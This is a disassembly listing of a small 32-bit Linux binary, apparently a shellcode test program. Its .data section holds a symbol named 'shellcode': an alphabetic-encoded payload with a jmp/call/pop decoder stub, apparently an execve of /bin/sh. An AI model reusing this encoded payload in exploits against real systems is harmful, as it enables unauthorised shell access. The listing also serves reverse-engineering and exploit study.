 8049f42:	04 08                	add    $0x8,%al
 8049f44:	1c 00                	sbb    $0x0,%al
 8049f46:	00 00                	add    %al,(%eax)
 8049f48:	04 00                	add    $0x0,%al
 8049f4a:	00 00                	add    %al,(%eax)
 8049f4c:	f5                   	cmc    
 8049f4d:	fe                   	(bad)  
 8049f4e:	ff 6f ac             	ljmp   *-0x54(%edi)
 8049f51:	81 04 08 05 00 00 00 	addl   $0x5,(%eax,%ecx,1)
 8049f58:	4c                   	dec    %esp
 8049f59:	82                   	(bad)  
 8049f5a:	04 08                	add    $0x8,%al
 8049f5c:	06                   	push   %es
 8049f5d:	00 00                	add    %al,(%eax)
 8049f5f:	00 cc                	add    %cl,%ah
 8049f61:	81 04 08 0a 00 00 00 	addl   $0xa,(%eax,%ecx,1)
 8049f68:	73 00                	jae    8049f6a <_DYNAMIC+0x56>
 8049f6a:	00 00                	add    %al,(%eax)
 8049f6c:	0b 00                	or     (%eax),%eax
 8049f6e:	00 00                	add    %al,(%eax)
 8049f70:	10 00                	adc    %al,(%eax)
 8049f72:	00 00                	add    %al,(%eax)
 8049f74:	15 00 00 00 00       	adc    $0x0,%eax
 8049f79:	00 00                	add    %al,(%eax)
 8049f7b:	00 03                	add    %al,(%ebx)
 8049f7d:	00 00                	add    %al,(%eax)
 8049f7f:	00 00                	add    %al,(%eax)
 8049f81:	a0 04 08 02 00       	mov    0x20804,%al
 8049f86:	00 00                	add    %al,(%eax)
 8049f88:	30 00                	xor    %al,(%eax)
 8049f8a:	00 00                	add    %al,(%eax)
 8049f8c:	14 00                	adc    $0x0,%al
 8049f8e:	00 00                	add    %al,(%eax)
 8049f90:	11 00                	adc    %eax,(%eax)
 8049f92:	00 00                	add    %al,(%eax)
 8049f94:	17                   	pop    %ss
 8049f95:	00 00                	add    %al,(%eax)
 8049f97:	00 08                	add    %cl,(%eax)
 8049f99:	83 04 08 11          	addl   $0x11,(%eax,%ecx,1)
 8049f9d:	00 00                	add    %al,(%eax)
 8049f9f:	00 00                	add    %al,(%eax)
 8049fa1:	83 04 08 12          	addl   $0x12,(%eax,%ecx,1)
 8049fa5:	00 00                	add    %al,(%eax)
 8049fa7:	00 08                	add    %cl,(%eax)
 8049fa9:	00 00                	add    %al,(%eax)
 8049fab:	00 13                	add    %dl,(%ebx)
 8049fad:	00 00                	add    %al,(%eax)
 8049faf:	00 08                	add    %cl,(%eax)
 8049fb1:	00 00                	add    %al,(%eax)
 8049fb3:	00 fe                	add    %bh,%dh
 8049fb5:	ff                   	(bad)  
 8049fb6:	ff 6f d0             	ljmp   *-0x30(%edi)
 8049fb9:	82                   	(bad)  
 8049fba:	04 08                	add    $0x8,%al
 8049fbc:	ff                   	(bad)  
 8049fbd:	ff                   	(bad)  
 8049fbe:	ff 6f 01             	ljmp   *0x1(%edi)
 8049fc1:	00 00                	add    %al,(%eax)
 8049fc3:	00 f0                	add    %dh,%al
 8049fc5:	ff                   	(bad)  
 8049fc6:	ff 6f c0             	ljmp   *-0x40(%edi)
 8049fc9:	82                   	(bad)  
 8049fca:	04 08                	add    $0x8,%al
	...

Дизассемблирование раздела .got:

08049ffc <.got>:
 8049ffc:	00 00                	add    %al,(%eax)
	...

Дизассемблирование раздела .got.plt:

0804a000 <_GLOBAL_OFFSET_TABLE_>:
 804a000:	14 9f                	adc    $0x9f,%al
 804a002:	04 08                	add    $0x8,%al
	...
 804a00c:	76 83                	jbe    8049f91 <_DYNAMIC+0x7d>
 804a00e:	04 08                	add    $0x8,%al
 804a010:	86 83 04 08 96 83    	xchg   %al,-0x7c69f7fc(%ebx)
 804a016:	04 08                	add    $0x8,%al
 804a018:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
 804a019:	83 04 08 b6          	addl   $0xffffffb6,(%eax,%ecx,1)
 804a01d:	83 04 08 c6          	addl   $0xffffffc6,(%eax,%ecx,1)
 804a021:	83                   	.byte 0x83
 804a022:	04 08                	add    $0x8,%al

Дизассемблирование раздела .data:

0804a040 <__data_start>:
 804a040:	00 00                	add    %al,(%eax)
	...

0804a044 <__dso_handle>:
	...

0804a060 <shellcode>:
 804a060:	eb 02                	jmp    804a064 <shellcode+0x4>
 804a062:	eb 05                	jmp    804a069 <shellcode+0x9>
 804a064:	e8 f9 ff ff ff       	call   804a062 <shellcode+0x2>
 804a069:	5f                   	pop    %edi
 804a06a:	81 ef df ff ff ff    	sub    $0xffffffdf,%edi
 804a070:	57                   	push   %edi
 804a071:	5e                   	pop    %esi
 804a072:	29 c9                	sub    %ecx,%ecx
 804a074:	80 c1 b8             	add    $0xb8,%cl
 804a077:	8a 07                	mov    (%edi),%al
 804a079:	2c 41                	sub    $0x41,%al
 804a07b:	c0 e0 04             	shl    $0x4,%al
 804a07e:	47                   	inc    %edi
 804a07f:	02 07                	add    (%edi),%al
 804a081:	2c 41                	sub    $0x41,%al
 804a083:	88 06                	mov    %al,(%esi)
 804a085:	46                   	inc    %esi
 804a086:	47                   	inc    %edi
 804a087:	49                   	dec    %ecx
 804a088:	e2 ed                	loop   804a077 <shellcode+0x17>
 804a08a:	44                   	inc    %esp
 804a08b:	42                   	inc    %edx
 804a08c:	4d                   	dec    %ebp
 804a08d:	41                   	inc    %ecx
 804a08e:	46                   	inc    %esi
 804a08f:	41                   	inc    %ecx
 804a090:	45                   	inc    %ebp
 804a091:	41                   	inc    %ecx
 804a092:	49                   	dec    %ecx
 804a093:	4a                   	dec    %edx
 804a094:	4d                   	dec    %ebp
 804a095:	44                   	inc    %esp
 804a096:	46                   	inc    %esi
 804a097:	41                   	inc    %ecx
 804a098:	45                   	inc    %ebp
 804a099:	41                   	inc    %ecx
 804a09a:	46                   	inc    %esi
 804a09b:	41                   	inc    %ecx
 804a09c:	49                   	dec    %ecx
 804a09d:	4a                   	dec    %edx
 804a09e:	4f                   	dec    %edi
 804a09f:	42                   	inc    %edx
 804a0a0:	4c                   	dec    %esp
 804a0a1:	41                   	inc    %ecx
 804a0a2:	47                   	inc    %edi
 804a0a3:	47                   	inc    %edi
 804a0a4:	4d                   	dec    %ebp
 804a0a5:	4e                   	dec    %esi
 804a0a6:	49                   	dec    %ecx
 804a0a7:	41                   	inc    %ecx
 804a0a8:	44                   	inc    %esp
 804a0a9:	42                   	inc    %edx
 804a0aa:	4e                   	dec    %esi
 804a0ab:	43                   	inc    %ebx
 804a0ac:	46                   	inc    %esi
 804a0ad:	43                   	inc    %ebx
 804a0ae:	47                   	inc    %edi
 804a0af:	47                   	inc    %edi
 804a0b0:	47                   	inc    %edi
 804a0b1:	49                   	dec    %ecx
 804a0b2:	42                   	inc    %edx
 804a0b3:	44                   	inc    %esp
 804a0b4:	4e                   	dec    %esi
 804a0b5:	43                   	inc    %ebx
 804a0b6:	45                   	inc    %ebp
 804a0b7:	44                   	inc    %esp
 804a0b8:	47                   	inc    %edi
 804a0b9:	47                   	inc    %edi
 804a0ba:	46                   	inc    %esi
 804a0bb:	44                   	inc    %esp
 804a0bc:	49                   	dec    %ecx
 804a0bd:	4a                   	dec    %edx
 804a0be:	4f                   	dec    %edi
 804a0bf:	42                   	inc    %edx
 804a0c0:	47                   	inc    %edi
 804a0c1:	4b                   	dec    %ebx
 804a0c2:	42                   	inc    %edx
 804a0c3:	41                   	inc    %ecx
 804a0c4:	46                   	inc    %esi
 804a0c5:	42                   	inc    %edx
 804a0c6:	46                   	inc    %esi
 804a0c7:	41                   	inc    %ecx
 804a0c8:	49                   	dec    %ecx
 804a0c9:	4a                   	dec    %edx
 804a0ca:	4f                   	dec    %edi
 804a0cb:	42                   	inc    %edx
 804a0cc:	4c                   	dec    %esp
 804a0cd:	41                   	inc    %ecx
 804a0ce:	47                   	inc    %edi
 804a0cf:	47                   	inc    %edi
 804a0d0:	4d                   	dec    %ebp
 804a0d1:	4e                   	dec    %esi
 804a0d2:	49                   	dec    %ecx
 804a0d3:	41                   	inc    %ecx
 804a0d4:	45                   	inc    %ebp
 804a0d5:	41                   	inc    %ecx
 804a0d6:	49                   	dec    %ecx
 804a0d7:	4a                   	dec    %edx
 804a0d8:	45                   	inc    %ebp
 804a0d9:	45                   	inc    %ebp
 804a0da:	43                   	inc    %ebx
 804a0db:	45                   	inc    %ebp
 804a0dc:	41                   	inc    %ecx
 804a0dd:	45                   	inc    %ebp
 804a0de:	45                   	inc    %ebp
 804a0df:	44                   	inc    %esp
 804a0e0:	45                   	inc    %ebp
 804a0e1:	44                   	inc    %esp
 804a0e2:	4c                   	dec    %esp
 804a0e3:	41                   	inc    %ecx
 804a0e4:	47                   	inc    %edi
 804a0e5:	47                   	inc    %edi
 804a0e6:	4d                   	dec    %ebp
 804a0e7:	4e                   	dec    %esi
 804a0e8:	49                   	dec    %ecx
 804a0e9:	41                   	inc    %ecx
 804a0ea:	49                   	dec    %ecx
 804a0eb:	44                   	inc    %esp
 804a0ec:	4d                   	dec    %ebp
 804a0ed:	45                   	inc    %ebp
 804a0ee:	41                   	inc    %ecx
 804a0ef:	4d                   	dec    %ebp
 804a0f0:	46                   	inc    %esi
 804a0f1:	43                   	inc    %ebx
 804a0f2:	46                   	inc    %esi
 804a0f3:	43                   	inc    %ebx
 804a0f4:	45                   	inc    %ebp
 804a0f5:	44                   	inc    %esp
 804a0f6:	4c                   	dec    %esp
 804a0f7:	41                   	inc    %ecx
 804a0f8:	47                   	inc    %edi
 804a0f9:	47                   	inc    %edi
 804a0fa:	4d                   	dec    %ebp
 804a0fb:	4e                   	dec    %esi
 804a0fc:	49                   	dec    %ecx
 804a0fd:	41                   	inc    %ecx
 804a0fe:	4a                   	dec    %edx
 804a0ff:	44                   	inc    %esp
 804a100:	49                   	dec    %ecx
 804a101:	4a                   	dec    %edx
 804a102:	4e                   	dec    %esi
 804a103:	42                   	inc    %edx
 804a104:	4c                   	dec    %esp
 804a105:	41                   	inc    %ecx
 804a106:	44                   	inc    %esp
 804a107:	50                   	push   %eax
 804a108:	4d                   	dec    %ebp
 804a109:	4e                   	dec    %esi
 804a10a:	49                   	dec    %ecx
 804a10b:	41                   	inc    %ecx
 804a10c:	45                   	inc    %ebp
 804a10d:	42                   	inc    %edx
 804a10e:	49                   	dec    %ecx
 804a10f:	41                   	inc    %ecx
 804a110:	50                   	push   %eax
 804a111:	4a                   	dec    %edx
 804a112:	41                   	inc    %ecx
 804a113:	44                   	inc    %esp
 804a114:	48                   	dec    %eax
 804a115:	46                   	inc    %esi
 804a116:	50                   	push   %eax
 804a117:	47                   	inc    %edi
 804a118:	46                   	inc    %esi
 804a119:	43                   	inc    %ebx
 804a11a:	47                   	inc    %edi
 804a11b:	49                   	dec    %ecx
 804a11c:	47                   	inc    %edi
 804a11d:	4f                   	dec    %edi
 804a11e:	43                   	inc    %ebx
 804a11f:	50                   	push   %eax
 804a120:	48                   	dec    %eax
 804a121:	44                   	inc    %esp
 804a122:	47                   	inc    %edi
 804a123:	49                   	dec    %ecx
 804a124:	47                   	inc    %edi
 804a125:	49                   	dec    %ecx
 804a126:	43                   	inc    %ebx
 804a127:	50                   	push   %eax
 804a128:	43                   	inc    %ebx
 804a129:	50                   	push   %eax
 804a12a:	47                   	inc    %edi
 804a12b:	43                   	inc    %ebx
 804a12c:	47                   	inc    %edi
 804a12d:	4a                   	dec    %edx
 804a12e:	49                   	dec    %ecx
 804a12f:	4a                   	dec    %edx
 804a130:	4f                   	dec    %edi
 804a131:	44                   	inc    %esp
 804a132:	46                   	inc    %esi
 804a133:	43                   	inc    %ebx
 804a134:	46                   	inc    %esi
 804a135:	44                   	inc    %esp
 804a136:	49                   	dec    %ecx
 804a137:	4a                   	dec    %edx
 804a138:	4f                   	dec    %edi
 804a139:	42                   	inc    %edx
 804a13a:	4c                   	dec    %esp
 804a13b:	41                   	inc    %ecx
 804a13c:	41                   	inc    %ecx
 804a13d:	4c                   	dec    %esp
 804a13e:	4d                   	dec    %ebp
 804a13f:	4e                   	dec    %esi
 804a140:	49                   	dec    %ecx
 804a141:	41                   	inc    %ecx
	...

Дизассемблирование раздела .bss:

0804a143 <__bss_start>:
	...

Дизассемблирование раздела .comment:

00000000 <.comment>:
   0:	47                   	inc    %edi
   1:	43                   	inc    %ebx
   2:	43                   	inc    %ebx
   3:	3a 20                	cmp    (%eax),%ah
   5:	28 55 62             	sub    %dl,0x62(%ebp)
   8:	75 6e                	jne    78 <_init-0x80482c0>
   a:	74 75                	je     81 <_init-0x80482b7>
   c:	20 34 2e             	and    %dh,(%esi,%ebp,1)
   f:	38 2e                	cmp    %ch,(%esi)
  11:	34 2d                	xor    $0x2d,%al
  13:	32 75 62             	xor    0x62(%ebp),%dh
  16:	75 6e                	jne    86 <_init-0x80482b2>
  18:	74 75                	je     8f <_init-0x80482a9>
  1a:	31 7e 31             	xor    %edi,0x31(%esi)
  1d:	34 2e                	xor    $0x2e,%al
  1f:	30 34 29             	xor    %dh,(%ecx,%ebp,1)
  22:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  25:	38 2e                	cmp    %ch,(%esi)
  27:	34 00                	xor    $0x0,%al
  29:	47                   	inc    %edi
  2a:	43                   	inc    %ebx
  2b:	43                   	inc    %ebx
  2c:	3a 20                	cmp    (%eax),%ah
  2e:	28 55 62             	sub    %dl,0x62(%ebp)
  31:	75 6e                	jne    a1 <_init-0x8048297>
  33:	74 75                	je     aa <_init-0x804828e>
  35:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  38:	38 2e                	cmp    %ch,(%esi)
  3a:	32 2d 31 39 75 62    	xor    0x62753931,%ch
  40:	75 6e                	jne    b0 <_init-0x8048288>
  42:	74 75                	je     b9 <_init-0x804827f>
  44:	31 29                	xor    %ebp,(%ecx)
  46:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  49:	38 2e                	cmp    %ch,(%esi)
  4b:	32 00                	xor    (%eax),%al
